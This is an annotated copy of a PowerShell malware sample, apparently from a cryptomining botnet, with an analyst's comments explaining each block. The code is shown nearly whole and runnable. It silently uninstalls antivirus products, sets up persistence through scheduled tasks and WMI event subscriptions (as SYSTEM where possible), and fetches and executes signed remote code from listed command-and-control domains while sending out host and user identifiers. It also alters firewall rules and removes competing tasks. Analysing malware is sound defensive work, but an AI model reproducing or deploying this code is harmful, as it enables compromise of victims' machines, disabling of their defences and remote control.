
# This block is checking for various AntiVirus products like Eset, Kaspersky, avast, avp, Norton etc and uninstalling them.
#-------------------------------------------block1--------------------------------------
cmd /c start /b wmic.exe product where "name like '%Eset%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%%Kaspersky%%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avast%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%avp%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Security%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%AntiVirus%'" call uninstall /nointeractive
cmd /c start /b wmic.exe product where "name like '%Norton Security%'" call uninstall /nointeractive
cmd /c "C:\Progra~1\Malwarebytes\Anti-Malware\unins000.exe" /verysilent /suppressmsgboxes /norestart
#-------------------------------------------block1#-------------------------------------------

$v="?"+(Get-Date -Format '_yyyyMMdd')

# A Powershell command that will be used later, 
$tmps='function a($u){$d=[text.encoding]::utf8.getbytes((new-object IO.StreamReader([net.webrequest]::create($u).getresponse().getresponsestream())).readtoend());$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String("2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=");$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url="http://"U1"U2"/a.jsp"+$v+"?"+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join"*");a($url)'

# Checks if the current PowerShell has Administrator Privelages
$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

# Generates a Random String
function getRan(){
	return -join([char[]](48..57+65..90+97..122)| Get-Random -Count (6+(Get-Random)%6))
}

# Array containing Domains, maybe C&C(Command and Control) server domains. 
$us=@('t[.]zz3r0[.]com','t[.]zker9[.]com','t[.]bb3u9[.]com')

# Creates Schedule Service object, Which could be used to view Scheduled tasks
$stsrv = New-Object -ComObject Schedule.Service
$stsrv.Connect()

# Checks if a task with name "blackball" is scheduled or not
try{
	$doit=$stsrv.GetFolder("\").GetTask("blackball")
}
catch{}

# If "blackball" is not scheduled
if(-not $doit){
    
    # Check if administer privelages, if schedule the task and run it as system user
	if($sa){
	    schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	}
    # otherwise schedule it as normal user
	else {
		schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr "blackball"
	}
    
    # for each domain the array of domains,
	foreach($u in $us){

		$i = [array]::IndexOf($us,$u)
		
        # Generate Random task name
		if($i%3 -eq 0){$tnf=''}
		if($i%3 -eq 1){$tnf=getRan}
		if($i%3 -eq 2){
			if($sa){
				$tnf='MicroSoft\Windows\'+(getRan)
			}
			else{
				$tnf=getRan
			}
		}
		$tn = getRan

        # If admininstrator privelages, then schedule a task to run PS_CMD powershell script as system user
		if($sa){
			schtasks /create /ru system /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -c PS_CMD"
		} 
        # Otherwise Schedule task as normal user
		else {
			schtasks /create /sc MINUTE /mo 60 /tn "$tnf\$tn" /F /tr "powershell -w hidden -c PS_CMD"
		}
        # Sleeps for 1 second
		start-sleep 1
		
        # Gets all the task created earlier into array.
		$folder=$stsrv.GetFolder("\$tnf")
		$taskitem=$folder.GetTasks(1)
		
        # For each task that were created, replace the PS_CMD command with the tmps variable set earlier, and Replace U1 and U2 with the domains that were declared earlier
		foreach($task in $taskitem){
			foreach ($action in $task.Definition.Actions) {
				try{
					if($action.Arguments.Contains("PS_CMD")){
						$folder.RegisterTask($task.Name, $task.Xml.replace("PS_CMD",$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5))), 4, $null, $null, 0, $null)|out-null
					}
				}catch{}
			}
		} 
        # Sleeps for 1 second		
		start-sleep 1
		
		schtasks /run /tn "$tnf\$tn" 
        
        # Sleeps for 1 second	
		start-sleep 5
	}
}

# Checks if an event with blackball exists or not
try{
	$doit1=Get-WMIObject -Class __EventFilter -NameSpace 'root\subscription' -filter "Name='blackball'"
}
catch{}

# if blackball event doesnot exist, then create the event
if(-not $doit1){
	Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="blackball";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";} -ErrorAction Stop
	
    # and add the task to run powershell script tmpfs declared earlier
	foreach($u in $us){
		$theName=getRan
		$wmicmd=$tmps.replace('U1',$u.substring(0,5)).replace('U2',$u.substring(5)).replace('a.jsp','aa.jsp')
		
		Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="f"+$theName;EventNameSpace="root\cimv2";Qu'+'eryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";} -ErrorAction Stop);Consumer=(Set-WmiIqfh+qfhnstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="c"+$theName;ExecutablePath="c:\windows\system32\cmd.exe";CommandLineTemplate="/c powershell -c $wmicmd"})}

		start-sleep 5
	}
	
	Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 ???Force
}
# This block adds some firewall rules
#----------------------------------------Block2----------------------------------------
cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSd
netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53
netsh advfirewall firewall add rule name="deny445" dir=in protocol=tcp localport=445 action=block
netsh advfirewall firewall add rule name="deny135" dir=in protocol=tcp localport=135 action=block
#----------------------------------------Block2----------------------------------------

# This block deletes scheduled tasks with name Rtsa, Rtsa1, Rtsa2
#----------------------------------------Block3----------------------------------------
schtasks /delete /tn Rtsa2 /F
schtasks /delete /tn Rtsa1 /F
schtasks /delete /tn Rtsa /F
#----------------------------------------Block3----------------------------------------